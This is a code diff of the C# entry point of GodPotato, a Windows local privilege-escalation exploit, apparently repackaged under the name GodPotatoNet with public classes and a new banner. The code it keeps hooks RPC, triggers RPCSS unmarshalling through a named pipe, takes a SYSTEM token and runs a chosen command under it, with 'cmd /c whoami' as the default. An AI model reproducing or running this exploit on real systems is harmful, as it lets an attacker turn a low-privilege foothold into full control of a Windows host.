@@ -1,48 +1,39 @@
 ﻿using System;
 using System.IO;
-using GodPotato.NativeAPI;
+using GodPotatoNet.NativeAPI;
 using System.Security.Principal;
 using SharpToken;
-using static GodPotato.ArgsParse;
+using static GodPotatoNet.ArgsParse;
 
-namespace GodPotato
+namespace GodPotatoNet
 {
-    internal class Program
+    // GodPotatoNet
+    public class Program
     {
 
-
-        class GodPotatoArgs
+        class GodPotatoNetArgs
         {
             [ArgsAttribute("cmd","cmd /c whoami",Description = "CommandLine",Required = true)]
             public string cmd { get; set; }
         }
 
-
-
-        static void Main(string[] args)
+        // GodPotatoNet
+        public static void Main(string[] args)
         {
             TextWriter ConsoleWriter = Console.Out;
 
-            GodPotatoArgs potatoArgs;
+            GodPotatoNetArgs potatoArgs;
 
-            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @"                                                                                               
-    FFFFF                   FFF  FFFFFFF                                                       
-   FFFFFFF                  FFF  FFFFFFFF                                                      
-  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
-  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
-  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
- FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
- FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
- FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
- FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
- FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
-  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
-  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
-   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
-    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
+            // GodPotatoNet 
+            string helpMessage = PrintHelp(typeof(GodPotatoNetArgs), @"                                                                              
+  ____           _ ____       _        _        _   _      _   
+ / ___| ___   __| |  _ \ ___ | |_ __ _| |_ ___ | \ | | ___| |_ 
+| |  _ / _ \ / _` | |_) / _ \| __/ _` | __/ _ \|  \| |/ _ \ __|
+| |_| | (_) | (_| |  __/ (_) | || (_| | || (_) | |\  |  __/ |_ 
+ \____|\___/ \__,_|_|   \___/ \__\__,_|\__\___/|_| \_|\___|\__|
+                                             
 "
-, "GodPotato", new string[0]);
-
+, "GodPotatoNet", new string[0]);
 
             if (args.Length == 0)
             {
@@ -53,7 +44,7 @@ namespace GodPotato
             {
                 try
                 {
-                    potatoArgs = ParseArgs<GodPotatoArgs>(args);
+                    potatoArgs = ParseArgs<GodPotatoNetArgs>(args);
                 }
                 catch (Exception e)
                 {
@@ -69,19 +60,19 @@ namespace GodPotato
 
             try
             {
-                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
+                GodPotatoNetContext GodPotatoNetContext = new GodPotatoNetContext(ConsoleWriter, Guid.NewGuid().ToString());
 
-                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
-                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
-                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
-                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);
+                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", GodPotatoNetContext.CombaseModule);
+                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", GodPotatoNetContext.DispatchTablePtr);
+                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", GodPotatoNetContext.UseProtseqFunctionPtr);
+                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", GodPotatoNetContext.UseProtseqFunctionParamCount);
 
                 ConsoleWriter.WriteLine("[*] HookRPC");
-                godPotatoContext.HookRPC();
+                GodPotatoNetContext.HookRPC();
                 ConsoleWriter.WriteLine("[*] Start PipeServer");
-                godPotatoContext.Start();
+                GodPotatoNetContext.Start();
 
-                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
+                GodPotatoNetUnmarshalTrigger unmarshalTrigger = new GodPotatoNetUnmarshalTrigger(GodPotatoNetContext);
                 try
                 {
                     ConsoleWriter.WriteLine("[*] Trigger RPCSS");
@@ -94,8 +85,7 @@ namespace GodPotato
                     ConsoleWriter.WriteLine(e);
                 }
 
-
-                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
+                WindowsIdentity systemIdentity = GodPotatoNetContext.GetToken();
                 if (systemIdentity != null)
                 {
                     ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
@@ -106,8 +96,8 @@ namespace GodPotato
                 {
                     ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");
                 }
-                godPotatoContext.Restore();
-                godPotatoContext.Stop();
+                GodPotatoNetContext.Restore();
+                GodPotatoNetContext.Stop();
             }
             catch (Exception e)
             {
